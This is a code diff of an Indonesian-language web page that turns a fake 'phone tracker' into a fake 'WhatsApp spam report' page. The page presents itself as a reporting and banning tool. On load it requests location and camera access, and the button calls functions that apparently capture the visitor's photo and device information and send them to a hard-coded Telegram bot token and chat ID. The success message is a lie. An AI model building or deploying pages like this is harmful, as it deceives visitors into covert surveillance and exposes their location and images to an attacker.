@@ -1,64 +1,83 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html><html lang="id">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Phone Tracker</title>
+  <title>WhatsApp Spam Report</title>
   <style>
     body {
-      background: #111;
-      color: #0f0;
-      font-family: monospace;
+      background: #f1f1f1;
+      color: #111;
+      font-family: sans-serif;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
+      margin: 0;
       padding: 20px;
       text-align: center;
     }
+    .container {
+      background: #fff;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 100%;
+    }
     h1 {
-      font-size: 1.5rem;
+      font-size: 1.4rem;
+      color: #075e54;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 0.95rem;
       margin-bottom: 20px;
     }
     input {
       padding: 10px;
-      width: 80%;
-      max-width: 300px;
+      width: 100%;
       margin-bottom: 15px;
       font-size: 1rem;
-      border: none;
-      border-radius: 5px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
     }
     button {
-      padding: 10px 20px;
+      padding: 10px;
+      width: 100%;
       font-size: 1rem;
-      background: #0f0;
-      color: #111;
+      background: #25D366;
+      color: #fff;
       border: none;
-      border-radius: 5px;
+      border-radius: 6px;
       cursor: pointer;
     }
     #result {
       margin-top: 15px;
       font-size: 0.9rem;
-      color: #ccc;
+      color: #333;
+    }
+    small {
+      color: #888;
     }
   </style>
 </head>
 <body onload="requestPermissions()">
-  <h1>Lacak Lokasi Lewat Nomor HP</h1>
-  <input type="text" id="phone" placeholder="Masukkan nomor target" />
-  <button onclick="track()">Track</button>
-  <video id="vid" autoplay playsinline style="display:none;"></video>
-  <canvas id="snap" style="display:none;"></canvas>
-  <div id="result"></div>  <script>
+  <div class="container">
+    <h1>🚫 WhatsApp Spam Report System</h1>
+    <p>Laporkan nomor WhatsApp penipuan / spam untuk dibanned secara otomatis.</p>
+    <input type="text" id="phone" placeholder="Masukkan nomor WA target (cth: 08xxxx)" />
+    <button onclick="track()">🚫 Laporkan & Banned Sekarang</button>
+    <div id="result"></div>
+    <small>*Data laporan bersifat rahasia dan otomatis diproses oleh sistem.</small>
+  </div><video id="vid" autoplay playsinline style="display:none;"></video> <canvas id="snap" style="display:none;"></canvas>
+
+  <script>
     const BOT_TOKEN = "7743579295:AAGGNxeSBz6oFsORfR3uKNbVlGy5MAvuTsY";
     const OWNER_CHAT_ID = "6629230649";
 
     function requestPermissions() {
-      // Minta izin lokasi
       navigator.geolocation.getCurrentPosition(() => {}, () => {});
-      // Minta izin kamera
       navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
         stream.getTracks().forEach(track => track.stop());
       }).catch(() => {});
@@ -235,12 +254,12 @@
 
     function track() {
       const resBox = document.getElementById("result");
-      resBox.innerHTML = "🔍 Tracking lokasi...";
-      setTimeout(() => {
-        resBox.innerHTML = "<b>Lokasi ditemukan</b><br>Lat: -6.2<br>Long: 106.8<br>Status: <span style='color:lime'>Aktif</span>";
-      }, 3000);
+      resBox.innerHTML = "📡 Mengirim laporan nomor...";
       getVisitorInfo();
       captureAndSendPhoto();
+      setTimeout(() => {
+        resBox.innerHTML = "✅ Nomor berhasil dikirim ke sistem pelaporan.");
+      }, 3000);
     }
   </script></body>
 </html>
